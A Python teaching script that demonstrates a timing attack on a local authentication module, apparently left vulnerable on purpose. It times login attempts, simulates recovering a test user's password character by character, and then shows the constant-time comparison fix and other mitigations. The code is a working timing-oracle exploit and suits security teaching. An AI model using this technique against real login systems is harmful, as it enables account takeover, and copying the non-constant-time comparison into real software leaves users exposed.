#!/usr/bin/env python3
"""
Timing Attack Demonstration
==========================
This script demonstrates how to exploit the timing attack vulnerability
in the vulnerable_auth.py system.

The vulnerability is in the password comparison using == instead of 
secrets.compare_digest(), which allows attackers to measure response
times to determine correct password characters.

EDUCATIONAL USE ONLY!
"""

import time
import statistics
import string
from vulnerable_auth import SecureUserAuth

class TimingAttackDemo:
    """
    Demonstrates a timing attack against the vulnerable authentication system.
    
    The attack works because string comparison with == short-circuits on the
    first incorrect character, while secrets.compare_digest() always takes
    the same amount of time regardless of where differences occur.
    """
    
    def __init__(self):
        self.auth = SecureUserAuth("timing_test.json")
        self.target_username = "victim"
        
        # Create a test user
        print("🎯 Setting up target user for timing attack demo...")
        self.auth.register_user(self.target_username, "RealPassword123!", "victim@test.com")
        print("✅ Target user created")
    
    def measure_response_time(self, password: str, iterations: int = 100) -> float:
        """
        Measure average response time for authentication attempt.
        
        Args:
            password: Password to test
            iterations: Number of attempts to average
            
        Returns:
            Average response time in seconds
        """
        times = []
        
        for _ in range(iterations):
            start_time = time.perf_counter()
            
            # Attempt authentication
            success, message, token = self.auth.authenticate_user(self.target_username, password)
            
            end_time = time.perf_counter()
            times.append(end_time - start_time)
        
        return statistics.mean(times)
    
    def demonstrate_timing_difference(self):
        """
        Demonstrate the timing difference between different password attempts.
        """
        print("\n" + "="*60)
        print("🕐 TIMING ATTACK DEMONSTRATION")
        print("="*60)
        
        # Test passwords with different characteristics
        test_cases = [
            ("Wrong1st", "Wrong from first character"),
            ("R", "Correct 1st character only"),
            ("Re", "Correct first 2 characters"),
            ("Rea", "Correct first 3 characters"),
            ("Real", "Correct first 4 characters"),
            ("RealP", "Correct first 5 characters"),
            ("RealPassword", "Correct prefix (12 chars)"),
            ("RealPassword123!", "Correct password"),
            ("WrongPassword123!", "Wrong password, same length")
        ]
        
        print("\n📊 Measuring response times...")
        results = []
        
        for password, description in test_cases:
            avg_time = self.measure_response_time(password, iterations=50)
            results.append((password, description, avg_time))
            print(f"Password: '{password:<20}' | Time: {avg_time:.6f}s | {description}")
        
        print("\n📈 Analysis:")
        
        # Find patterns
        baseline_time = results[0][2]  # Wrong from first character
        
        for password, description, avg_time in results[1:]:
            time_diff = avg_time - baseline_time
            percentage = ((avg_time - baseline_time) / baseline_time) * 100
            
            if time_diff > 0:
                print(f"   '{password}' takes {time_diff:.6f}s longer ({percentage:+.2f}%)")
            else:
                print(f"   '{password}' takes {abs(time_diff):.6f}s shorter ({percentage:+.2f}%)")
    
    def timing_attack_simulation(self):
        """
        Simulate a character-by-character timing attack.
        """
        print("\n" + "="*60)
        print("🎯 SIMULATED TIMING ATTACK")
        print("="*60)
        
        known_password = ""
        possible_chars = string.ascii_letters + string.digits + "!@#$%^&*()"
        
        print("\n🔍 Attempting to discover password character by character...")
        
        for position in range(15):  # Try up to 15 characters
            best_char = None
            best_time = 0
            
            print(f"\n📍 Position {position + 1}: Testing characters...")
            
            for char in possible_chars[:10]:  # Test first 10 chars for demo
                test_password = known_password + char + "X" * (20 - len(known_password) - 1)
                
                # Measure time for this character
                avg_time = self.measure_response_time(test_password, iterations=10)
                
                if avg_time > best_time:
                    best_time = avg_time
                    best_char = char
                
                print(f"   Testing '{char}': {avg_time:.6f}s")
            
            if best_char:
                known_password += best_char
                print(f"✅ Best candidate for position {position + 1}: '{best_char}'")
                print(f"🔑 Current password guess: '{known_password}'")
                
                # Test if we have the complete password
                success, message, token = self.auth.authenticate_user(self.target_username, known_password)
                if success:
                    print(f"🎉 PASSWORD CRACKED: '{known_password}'")
                    break
            else:
                print("❌ No clear timing pattern detected")
                break
    
    def demonstrate_mitigation(self):
        """
        Show how to fix the timing attack vulnerability.
        """
        print("\n" + "="*60)
        print("🛡️  VULNERABILITY MITIGATION")
        print("="*60)
        
        print("\n❌ VULNERABLE CODE:")
        print("```python")
        print("# This is vulnerable to timing attacks!")
        print("if provided_hash == expected_hash:")
        print("    # Login successful")
        print("```")
        
        print("\n✅ SECURE CODE:")
        print("```python")
        print("import secrets")
        print("")
        print("# This prevents timing attacks!")
        print("if secrets.compare_digest(provided_hash, expected_hash):")
        print("    # Login successful")
        print("```")
        
        print("\n📋 Why this works:")
        print("• secrets.compare_digest() uses constant-time comparison")
        print("• Always takes the same amount of time regardless of differences")
        print("• Prevents attackers from measuring timing differences")
        print("• Recommended by security experts for cryptographic comparisons")
        
        print("\n🔧 Additional mitigations:")
        print("• Add random delays to authentication responses")
        print("• Rate limiting (already implemented)")
        print("• Account lockouts (already implemented)")
        print("• Monitor for suspicious timing patterns")
        print("• Use proper cryptographic libraries")


def main():
    """Run the timing attack demonstration."""
    print("="*80)
    print("⚠️  TIMING ATTACK VULNERABILITY DEMONSTRATION")
    print("="*80)
    print("This demonstrates a real security vulnerability!")
    print("EDUCATIONAL PURPOSES ONLY - Do not use on systems you don't own!")
    print("="*80)
    
    response = input("\nProceed with demonstration? (yes/no): ").lower().strip()
    if response != 'yes':
        print("Demo cancelled.")
        return
    
    demo = TimingAttackDemo()
    
    try:
        # Demonstrate timing differences
        demo.demonstrate_timing_difference()
        
        # Simulate attack
        demo.timing_attack_simulation()
        
        # Show mitigation
        demo.demonstrate_mitigation()
        
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user.")
    except Exception as e:
        print(f"\nError during demonstration: {e}")
    
    print("\n" + "="*80)
    print("📚 LEARNING SUMMARY:")
    print("• Timing attacks can reveal sensitive information")
    print("• Always use constant-time comparison for cryptographic values")
    print("• Defense in depth: multiple security layers are important")
    print("• Security requires attention to subtle implementation details")
    print("="*80)


if __name__ == "__main__":
    main()